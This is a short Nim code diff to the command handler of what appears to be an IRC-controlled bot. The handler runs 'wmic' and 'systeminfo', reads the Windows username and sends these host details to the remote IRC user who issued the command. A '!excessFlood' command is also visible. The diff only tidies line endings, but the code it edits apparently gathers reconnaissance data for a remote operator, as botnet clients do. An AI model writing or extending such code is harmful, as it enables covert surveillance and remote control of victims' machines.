@@ -468,6 +468,7 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
         try:
             var (output, _ ) = execCmdEx("cmd.exe /c wmic os get Caption,CSDVersion /value" ,options = {poUsePath})
             output = output.strip(chars={'\r','\n'})
+            output.stripLineEnd()
             win_csd = output
         except OSError as e:
             #win_csd = repr(e)
@@ -476,6 +477,7 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
         try:
             var (output, _ ) = execCmdEx("cmd.exe /c systeminfo" ,options = {poUsePath})
             output = output.strip(chars={'\r','\n'})
+            output.stripLineEnd()
             win_sys = output
         except OSError as e:
             #win_sys = repr(e)
@@ -483,19 +485,22 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
         try:
             var (output, _ ) = execCmdEx("cmd.exe /c wmic computersystem get Model /value" ,options = {poUsePath})
             output = output.strip(chars={'\r','\n'})
+            output.stripLineEnd()
             win_mod = output
         except OSError as e:
             #win_mod = repr(e)
             discard
         
-        discard client.privmsg(event.origin,
-            "heyyy v" & 
-            $current_version & " as " & getEnv("USERNAME") &
-            " VER: [" & win_ver & "]" &
-            " CSD: [" & win_csd & "]" &
-            " SYS: [" & win_sys & "]" &
-            " MOD: [" & win_mod & "]" 
-            )
+        var finalmsg:string =  "heyyy v" & 
+                        $current_version & " as " & getEnv("USERNAME") &
+                        " VER: [" & win_ver & "]" &
+                        " CSD: [" & win_csd & "]" &
+                        " SYS: [" & win_sys & "]" &
+                        " MOD: [" & win_mod & "]" 
+        finalmsg = finalmsg.strip(chars={'\r','\n'})
+        finalmsg.stripLineEnd()
+
+        discard client.privmsg(event.origin, finalmsg)
 
     of "!lag": discard client.privmsg(event.origin, formatFloat(client.getLag))
     of "!excessFlood":
